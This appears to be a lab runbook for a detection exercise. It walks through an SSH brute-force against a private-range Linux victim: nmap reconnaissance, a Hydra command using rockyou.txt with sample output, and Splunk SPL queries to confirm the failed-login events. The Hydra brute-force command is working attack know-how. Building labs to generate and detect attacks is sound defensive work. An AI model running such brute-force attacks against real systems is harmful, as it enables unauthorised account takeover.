# Attack Runbook — SSH Brute-Force (Linux Victim)

This document describes the exact steps used to reproduce the attack in this scenario, from attacker execution to log verification in Splunk.

**Attacker:** Kali Linux — `192.168.54.40`
**Target:** Linux victim — `192.168.54.30` (SSH, port 22)
**Target account:** `khoa`

---

## 1. Reconnaissance

Confirm the target is reachable and SSH is listening:

```bash
ping -c 4 192.168.54.30
nmap -p 22 192.168.54.30
```

Expected result: `22/tcp open ssh`.

> **Note:** SSH is not enabled by default on a fresh Ubuntu install. If closed, install and start it on the victim first:
> ```bash
> sudo apt update
> sudo apt install openssh-server -y
> sudo systemctl enable ssh
> sudo systemctl start ssh
> ```

## 2. Brute-force execution (Hydra)

```bash
hydra -l khoa -P /usr/share/wordlists/rockyou.txt ssh://192.168.54.30
```

- Wordlist: `rockyou.txt` (14,344,399 candidate passwords)
- Parallelism: 16 tasks (Hydra default max for SSH)
- Observed throughput: ~250–260 tries/minute

Sample output:

```
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
[DATA] attacking ssh://192.168.54.30:22/
[STATUS] 260.00 tries/min, 260 tries in 00:01h, 13 active
```

## 3. Verify logs arrived in Splunk

```spl
index="linuxlogs" "Failed password"
| table _time, host, src_ip, user
| head 20
```

Confirm events show `host=Linux-victim`, `sourcetype=linux_secure`, and the correct source IP (`192.168.54.40`).

## 4. Run the detection query

See [`spl-detection.md`](spl-detection.md) for the full SPL used to correlate brute-force bursts and the breach-verification query.

## 5. Stop / clean up

```bash
rm -f hydra.restore   # clear any resumed session state
```

On the victim, no further action is required if the breach-verification query (Event: `Accepted password`) returns 0 results — see [Incident Report](incident-report.pdf), Section 3.3.
